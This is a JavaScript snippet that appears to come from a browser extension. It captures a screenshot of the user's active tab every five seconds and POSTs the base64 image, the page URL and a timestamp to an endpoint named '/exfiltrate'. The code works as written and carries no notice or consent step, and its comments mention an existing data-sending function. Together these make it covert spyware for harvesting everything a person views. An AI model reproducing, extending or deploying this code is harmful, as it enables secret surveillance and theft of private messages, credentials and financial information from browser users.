// Function to capture a screenshot of the visible tab
function captureScreenshot() {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        if (tabs.length === 0) {
            console.error("No active tab found.");
            return;
        }

        const activeTab = tabs[0];

        // Skip capturing restricted pages (e.g., chrome://, about:)
        if (activeTab.url.startsWith("chrome://") || activeTab.url.startsWith("about:")) {
            console.error("Cannot capture restricted page:", activeTab.url);
            return;
        }

        // Capture the visible tab
        chrome.tabs.captureVisibleTab(activeTab.windowId, { format: "png" }, (dataUrl) => {
            if (chrome.runtime.lastError) {
                console.error("Error capturing screenshot:", chrome.runtime.lastError.message);
                return;
            }

            console.log("Screenshot captured:", dataUrl);
            sendScreenshotToServer(dataUrl); // Send the screenshot to the server
        });
    });
}

// Function to send the screenshot to the server
function sendScreenshotToServer(dataUrl) {
    const timestamp = new Date().toISOString();
    const payload = {
        screenshot: dataUrl, // Base64-encoded screenshot
        timestamp: timestamp, // Timestamp of the screenshot
        url: window.location.href // URL of the page being captured
    };

    // Use your existing sendToServer function
    sendToServer("screenshot", payload);
}

// Set up a timer to capture screenshots every 5 seconds
let screenshotInterval = setInterval(captureScreenshot, 5000);

// Stop the interval if needed (e.g., when the extension is disabled)
chrome.runtime.onSuspend.addListener(() => {
    clearInterval(screenshotInterval);
    console.log("Screenshot capture stopped.");
});

// Your existing sendToServer function
function sendToServer(type, results) {
    fetch("http://localhost:3000/exfiltrate", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({ type: type, data: results }),
    })
    .then((response) => {
        if (response.ok) {
            console.log("Data sent successfully:", type);
        } else {
            console.error("Failed to send data:", type, response.statusText);
        }
    })
    .catch((error) => {
        console.error("Error sending data:", type, error);
    });
}